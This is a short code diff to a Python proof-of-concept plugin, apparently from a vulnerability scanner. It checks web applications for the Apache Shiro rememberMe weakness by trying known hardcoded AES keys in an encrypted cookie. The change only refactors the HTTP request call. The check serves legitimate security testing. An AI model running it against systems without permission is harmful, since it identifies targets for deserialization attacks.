@@ -3,12 +3,11 @@
 '''
 Date: 2022-03-23 16:29:35
 LastEditors: recar
-LastEditTime: 2022-03-23 18:23:13
+LastEditTime: 2022-03-24 14:24:30
 '''
 from plugins.poc.base import PocBase
 import base64
 import uuid
-import requests
 from Crypto.Cipher import AES
 ##  'kPH+bIxk5D2deZiIxcaaaA=='
 keys = [
@@ -92,10 +91,8 @@ class Poc(PocBase):
             base64_ciphertext_2 = self.aes_v2(checker,key)
             for base64_ciphertext in [base64_ciphertext_1, base64_ciphertext_2]:
                 cookie={"rememberMe":base64_ciphertext.decode()}
-                rsp = requests.get(
-                    self.base_url, cookies=cookie,
-                    headers=self.headers,allow_redirects=False,
-                    verify=False)
+                rsp = self.request(
+                    self.base_url, cookies=cookie)
                 if 'Set-Cookie' not in rsp.headers.keys() or "rememberMe=deleteMe" not in rsp.headers.get("Set-Cookie"):
                     return True, key
         return False, None
